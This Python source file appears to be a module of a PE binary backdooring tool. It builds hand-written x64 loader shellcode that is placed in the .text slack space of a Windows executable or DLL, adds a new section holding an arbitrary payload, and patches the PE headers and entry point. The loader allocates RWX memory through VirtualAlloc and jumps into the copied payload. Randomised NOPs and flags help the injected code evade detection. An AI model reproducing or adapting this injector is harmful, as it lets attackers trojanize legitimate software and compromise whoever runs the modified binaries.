import os
import logging
from core import enum
from pe.core import core
from pe.core import eat_code_caves
import struct
from random import choice
from pe.core import intelCore
import secrets
logger = logging.getLogger(__name__)


class dll_loader_add_section:

    def __init__(self, BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """dll_loader_add_section"""
        self.description = """Places a stub in the text section, finds one code cave, and loads payloads in memory"""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')
        self.requirements = {
                            }
        self.BDF = BDF
        
        self.supported_methods = ['hook_dll_exports',]
        # placeholder as this is updated later after the payload
        #  is placed in a code cave
        self.distance_from_payload = b"\x00\x00\x00\x00\x00\x00\x00\x00"


    def invoke_mode(self):

        return self.main()

    def main(self):
        self.BDF.pe_object['ExportAPI_at_text'] = 0
        self.BDF.pe_object['txt_vrt_slck_loc'] = self.BDF.pe_object['textVirtualAddress'] + \
            self.BDF.pe_object['ImageBase'] + \
            self.BDF.pe_object['textVirtualSize']
        logger.info(f"txt_vrt_slck_loc: {self.BDF.pe_object['txt_vrt_slck_loc']}, hex: {hex(self.BDF.pe_object['txt_vrt_slck_loc'])}")
        # overwrite these
        if self.BDF.TESTING:
            self.flag = b"\x41\x41\x41\x41"
        else:
            self.flag = secrets.token_bytes(4)
        logger.debug(f'Payload flag: {self.flag}')

        self.shellcode = self.flag + self.BDF.pe_object['shellcode']
        self.shellcode_len = len(self.shellcode) + len(self.BDF.pe_object['resumeExe'])
        # push api addr that is located at start of text section

        # Start all other loaders here
        # save registers
        self.loader = b"\x90"
        # push the api export address address that abuts the .text section
        self.loader += b"\x50"                   # push rax
        self.loader += b"\xE8\x00\x00\x00\x00"   # call +5
        self.loader += b"\x58"                   # pop rax
        self.loader += b"\x48\x2D"               # substract rax, offset                          
        self.loader += struct.pack("<I", self.BDF.pe_object['txt_vrt_slck_loc'] - self.BDF.pe_object['ImageBase'] + len(self.loader) - 3)
        self.loader += b"\x49\xC7\xC6"           # mov r14, <value below>
        self.api_export_addr_loc = len(self.loader)
        self.loader += b"\x00\x00\x00\x00"       # If there is an address update it later
        self.loader += b"\x49\x01\xC6"                                      # add r14 + rax
        self.loader += b"\x58"                   # pop rax
        self.loader += b"\x41\x56"               # push r14
        self.BDF.pe_object['normal_loader_start_loc'] = len(self.loader)
        # other entry for loader
        self.loader += b"\x90"
        self.loader += b"\x50"                   # push rax
        self.loader += b"\x51"                   # push rcx
        self.loader += b"\x9c"                   # pushf
        self.loader_distance_offset = len(self.loader)

        # get location
        self.loader += b"\xE8\x00\x00\x00\x00"   # call +5
        self.loader += b"\x58"                   # pop rax

        self.loader += b"\x48\xb9"               # mov value below to rcx
        # Flag location beginning of cave
        self.loader_distance_from_payload_offset = len(self.loader)

        self.loader += self.distance_from_payload
        # check flag
        self.loader += b"\x48\x01\xC8"           # add rax, rcx
        self.loader += b"\x50"                   # push addr on stack
        self.loader += b"\x8B\x00"               # mov eax, DWORD ptr [rax]
        self.loader += b"\x85\xC0"               # test eax, eax
        self.loader += b"\x58"                   # pop the address back in rax
        self.loader += b"\x75\x05"               # jne 0X flip flag
        # don't load
        self.loader += b"\x9D"                   # popf
        self.loader += b"\x59"                   # pop rcx
        self.loader += b"\x58"                   # pop rax
        self.loader += b"\xff\xe0"               # jmp rax

        # flip flag
        self.loader += b"\xC7\x00\x00\x00\x00\x00"  # mov DWORD ptr [rax], 0
        # load payload
        self.loader += b"\x9D"                   # popf
        self.loader += b"\x59"                   # pop rcx
        self.loader += b"\x58"                   # pop rax

        self.loader += self.stackpreserve
        # GET ASLR MASK
        self.loader += b"\xfc"                   # CLD
        self.loader += b"\xE8\x00\x00\x00\x00"   # call +5
        self.loader += b"\x58"                   # pop rax
        # rax has current location in the text section at execution.

        self.loader_offset = len(self.loader) - 1

        self.loader += b"\x48\x2D"                                         # substract rax, offset

        self.loader += struct.pack("<I", self.BDF.pe_object['txt_vrt_slck_loc'] - self.BDF.pe_object['ImageBase'] + self.loader_offset)
        # ASLR MASK now in RAX

        self.loader += b"\x49\xBE"                                         # mov value below to r14
        if self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['ImageBase']) < 0:
            self.loader += struct.pack("<Q", 0xffffffff + (self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['ImageBase']) + 1))
        else:
            self.loader += struct.pack("<Q", self.BDF.pe_object[b'VirtualAlloc'] - (self.BDF.pe_object['ImageBase']))
        # RDX holds entry point
        self.loader += b"\x49\x01\xC6"                                      # add r14 + rax
        self.loader += b"\x49\xBF"                                          # mov value below to r15
        if self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['ImageBase']) < 0:
            self.loader += struct.pack("<Q", 0xffffffff + (self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['ImageBase']) + 1))
        else:
            self.loader += struct.pack("<Q", self.BDF.pe_object[b'CreateThread'] - (self.BDF.pe_object['ImageBase']))
        self.loader += b"\x49\x01\xC7"                                      # add r15 + rax
        self.loader += b"\x49\x89\xC4"                                      # mov r12, rax ASLR mask in r12
        # r14 virtualalloc
        # r15 createthread

        self.loader += (b"\x5d"                                             # pop rbp
                        b"\x49\xc7\xc5"                                     # mov r13, size of payload...
                        )

        self.loader += struct.pack("<I", self.shellcode_len)
        self.loader += bytes("\x6a\x40"                                       # push 40h
                             "\x41\x59"                                       # pop r9 now 40h
                             "\x68\x00\x10\x00\x00"                           # push 1000h
                             "\x41\x58"                                       # pop r8.. now 1000h
                             "\x4C\x89\xEA"                                   # mov rdx, r13
                             "\x6A\x00"                                       # push 0
                             "\x59"                                           # pop rcx
                             "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                             "\x41\xFF\x16"                                   # call qword ptr [r14]
                             "\x48\x89\xc3",                                  # mov rbx, rax      ; Store allocated address in rbx
                             'iso-8859-1')
        self.loader += b"\x48\x89\xc7"                                       # mov rdi, rax      ; Prepare RDI with the new address
        self.loader += b"\x48\xc7\xc1"                                       # mov rcx, value below

        self.loader_resume_exe_offset = len(self.loader)

        self.loader += struct.pack("<I", len(self.BDF.pe_object['payload_stub']) + self.BDF.pe_object['resumeExe_len'])

        self.loader += b"\xE8\x00\x00\x00\x00"                               # call +5
        # offset from here to end of loader length + 4 for flag offset
        self.loader += b"\x5E"                                               # pop rsi <-- call address points to here
        self.loader += b"\x48\xB8"                                           # mov rax, value below

        self.second_distance_from_payload_offset = len(self.loader)
        if self.distance_from_payload == b"\x00\x00\x00\x00\x00\x00\x00\x00":

            self.loader += self.distance_from_payload
        # else:
        #    self.loader += struct.pack("<Q", struct.unpack("<Q", self.distance_from_payload)[0] - len(self.loader) + 0x16)
        self.loader += b"\x48\x01\xC6"                                      # add rsi, rax  rsi is the address of the payload in a code cave

        self.loader += bytes("\xf2\xa4"                                     # rep movsb          ; Copy the payload to RWX memory
                             "\xff\xe3",                                    # jmp rbx
                             'iso-8859-1')
        # END LOADER

        self.BDF.pe_object['loader_stub'] = self.loader

        if 'loader_stub' not in self.BDF.pe_object:
            logger.error('Loader_stub object missing, wrong payload for METHOD and/or MODE?')
            self.BDF.pe_object['loader_stub'] = b'\x00'
            return False

        logger.info(f"Loader len: {hex(len(self.BDF.pe_object['loader_stub']))}, {len(self.BDF.pe_object['loader_stub'])}")
        logger.info(f"payload_stub len: {hex(len(self.BDF.pe_object['payload_stub']))}, {len(self.BDF.pe_object['payload_stub'])}")

        #  see if the loader + the resumeEXE will fit in the text section
        logger.info(f"ResumeEXE stub len: {len(self.BDF.pe_object['resumeExe'])}")

        self.BDF.pe_object['txt_slck_spc'] = self.BDF.pe_object['textSizeRawData'] - \
            self.BDF.pe_object['textVirtualSize']

        logger.info(f"slack_space_size: hex: {hex(self.BDF.pe_object['txt_slck_spc'])}, {self.BDF.pe_object['txt_slck_spc']}")

        if self.BDF.pe_object['txt_slck_spc'] >= len(self.BDF.pe_object['loader_stub']):
            logger.info(f"Text slack space is large enough")
        else:
            logger.error(f"Text slack space is too small, the dev will need to write a process expand the text section and update all the headers")
            return False

        # assign where the entrypoint hook should go:
        self.BDF.pe_object['text_loader_location'] = self.BDF.pe_object['textPointerToRawData'] + \
            self.BDF.pe_object['textVirtualSize']

        # overwrite JMPtoCodeAddress with the text_loader location
        logger.debug(f"text_loader_location: {hex(self.BDF.pe_object['text_loader_location'])}")
        self.BDF.pe_object['JMPtoCodeAddress'] = self.BDF.pe_object['text_loader_location'] - \
            self.BDF.pe_object['LocOfEntryinCode'] - 5
        logger.debug(f"JMPtoCodeAddress in text_loader: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

        # PatchLocation is where the jmp off point from either entry or the loader.

        self.BDF.pe_object['PatchLocation'] = (self.BDF.pe_object['text_loader_location'] +
                                               self.loader_distance_offset +
                                               (self.BDF.pe_object['textVirtualAddress'] -
                                               self.BDF.pe_object['textPointerToRawData'])
                                               )

        # override change access for caves not needed
        self.BDF.options['CHANGE_ACCESS'] = False

        if not self.create_code_cave():
            return False

        # Overwrite the distance to the payload in the loader itself
        # Update payload location in cave that is also the flag location
        loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.loader_distance_from_payload_offset]
        loader_tmp_back = self.BDF.pe_object['loader_stub'][self.loader_distance_from_payload_offset + len(self.distance_from_payload):]

        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['PayloadNewSection']) + loader_tmp_back

        # Overwrite 2nd distance to payload offset

        loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.second_distance_from_payload_offset]
        loader_tmp_back = self.BDF.pe_object['loader_stub'][self.second_distance_from_payload_offset + len(self.distance_from_payload):]

        # | rep movsb loc -> CaveLoC = .current .txt location + loc of address + size of 
        # +4 for the offset of the flag
        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['PayloadNewSection'] -
                                                                           self.second_distance_from_payload_offset + 
                                                                           0x4 +  # flag location
                                                                           0x27   # Offset from end distance_payload back to call $5 + pop rsi
                                                                           ) + loader_tmp_back

        # Overwrite the resumeExe len
        loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.loader_resume_exe_offset]
        loader_tmp_back = self.BDF.pe_object['loader_stub'][self.loader_resume_exe_offset + 4:]

        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<I", self.shellcode_len -
                                                                           len(self.flag)) + loader_tmp_back

        self.completeShellcode = self.shellcode + self.BDF.pe_object['resumeExe']

        return True

    def create_code_cave(self):
        """
        This function creates a code cave for shellcode to hide,
        takes in the dict from gather_file_info_win function and
        writes to the file and returns flItms
        """
        logger.info("[*] Creating Code Cave as a PE Section")
        self.BDF.pe_object['NewSectionSize'] = len(self.BDF.pe_object['shellcode']) + 0x250  # bytes
        if 'NSECTION' in self.BDF.options.keys():

            self.BDF.pe_object['SectionName'] = self.BDF.options['NSECTION']  # less than 7 chars
        else:
            self.BDF.pe_object['SectionName'] = b'sdata'
        #print(f"{self.BDF.pe_object['NewSizeOfImage']}")
        #print(f"{self.BDF.patch_instr=}")
        #print(f"{self.BDF.pe_object['NewSizeOfImage']=}")
        if 'newSectionPointerToRawData_iat' in self.BDF.patch_instr:
            # IDT (IAT) was added as a new section
            logger.debug('[*] Using filesize + IDT section as new file size')
            self.BDF.pe_object['filesize'] = struct.unpack("<I", self.BDF.patch_instr['newSectionPointerToRawData_iat'])[0] + \
                                             struct.unpack("<I", self.BDF.patch_instr["SizeOfRawData_iat"])[0]
        else:
            self.BDF.pe_object['filesize'] = self.BDF.pe_object['filename'].getbuffer().nbytes
            #print(f"el file sizeo: {self.BDF.pe_object['filesize']}")
        self.BDF.pe_object['newSectionPointerToRawData'] = self.BDF.pe_object['filesize']
        self.BDF.pe_object['VirtualSize'] = int(str(self.BDF.pe_object['NewSectionSize']), 16)
        self.BDF.pe_object['SizeOfRawData'] = self.BDF.pe_object['VirtualSize']
        self.BDF.pe_object['NewSectionName'] = b"." + self.BDF.pe_object['SectionName']
        self.BDF.pe_object['newSectionFlags'] = int('C0000040', 16)
        self.BDF.pe_object['CodeCaveVirtualAddress'] = (self.BDF.pe_object['SizeOfImage'] +
                                                 self.BDF.pe_object['ImageBase'])
        self.BDF.pe_object['buffer'] = int('200', 16)
        self.BDF.pe_object['PayloadNewSection'] = (self.BDF.pe_object['CodeCaveVirtualAddress'] -
                                                   self.BDF.pe_object['PatchLocation'] -
                                                   self.BDF.pe_object['ImageBase'] - 5 +
                                                   self.BDF.pe_object['buffer'])

        self.BDF.pe_object['NewCodeCave'] = True

        return True

    def get_patch_instr(self):
        # sneaking this in.
        loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.api_export_addr_loc]
        loader_tmp_back = self.BDF.pe_object['loader_stub'][self.api_export_addr_loc + 4:]

        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<I", self.BDF.pe_object["ExportAPI_at_text"]) + loader_tmp_back

        logger.debug(f"loader_stub: {self.BDF.pe_object['loader_stub']}")

        # Put text full_loader in text section
        self.BDF.patch_instr[self.BDF.pe_object['text_loader_location']] = self.BDF.pe_object['loader_stub']

        # Update virtual size to textSizeRawData size
        self.BDF.patch_instr[self.BDF.pe_object['.text\x00\x00\x00_VirtualSize_LOC']] = struct.pack('<I', self.BDF.pe_object['textSizeRawData'])

        # Patch header
        self.BDF.patch_instr[self.BDF.pe_object['pe_header_location'] + 6] = struct.pack('<H', self.BDF.pe_object['NumberOfSections'] + 1)

        self.BDF.pe_object['NewSizeOfImage'] = (self.BDF.pe_object['VirtualSize'] +
                                                self.BDF.pe_object['SizeOfImage'])

        self.BDF.patch_instr[self.BDF.pe_object['SizeOfImageLoc']] = struct.pack('<I', self.BDF.pe_object['NewSizeOfImage'])

        if self.BDF.pe_object['BoundImportLOCinCode'] != 0:
            self.BDF.patch_instr[self.BDF.pe_object['BoundImportLocation']] = struct.pack('<I', self.BDF.pe_object['BoundImportLOCinCode'] + 40)

        self.BDF.patch_instr[self.BDF.pe_object['BeginSections'] + 40 * self.BDF.pe_object['NumberOfSections']] = self.BDF.pe_object['NewSectionName'] + b"\x00" * (8 - len(self.BDF.pe_object['NewSectionName']))

        self.BDF.patch_instr['VirtualSize'] = struct.pack('<I', self.BDF.pe_object['VirtualSize'])

        self.BDF.patch_instr['SizeOfImage'] = struct.pack('<I', self.BDF.pe_object['SizeOfImage'])

        self.BDF.patch_instr['SizeOfRawData'] = struct.pack('<I', self.BDF.pe_object['SizeOfRawData'])

        self.BDF.patch_instr['newSectionPointerToRawData'] = struct.pack('<I', self.BDF.pe_object['newSectionPointerToRawData'])

        logger.debug(f"New Section PointerToRawData,: {self.BDF.pe_object['newSectionPointerToRawData']}")

        self.BDF.patch_instr['CONT1'] = struct.pack('<I', 0)

        self.BDF.patch_instr['CONT2'] = struct.pack('<I', 0)

        self.BDF.patch_instr['CONT3'] = struct.pack('<I', 0)

        self.BDF.patch_instr['newSectionFlags'] = struct.pack('<I', self.BDF.pe_object['newSectionFlags'])

        self.BDF.patch_instr['ImportTableALL'] = self.BDF.pe_object['ImportTableALL']

        if self.BDF.TESTING:
            nop = 0x90
        else:
            nop = choice(intelCore.intelCore.nops)

        if nop > 144:
            self.BDF.patch_instr[self.BDF.pe_object['filesize'] + 1] = struct.pack('!H', nop) * int((self.BDF.pe_object['VirtualSize'] / 2))
        else:
            self.BDF.patch_instr[self.BDF.pe_object['filesize'] + 1] = struct.pack('!B', nop) * (self.BDF.pe_object['VirtualSize'])

        logger.debug(hex(self.BDF.pe_object['newSectionPointerToRawData'] + self.BDF.pe_object['buffer']))

        self.BDF.patch_instr[self.BDF.pe_object['newSectionPointerToRawData'] + self.BDF.pe_object['buffer']] = self.completeShellcode

        return True
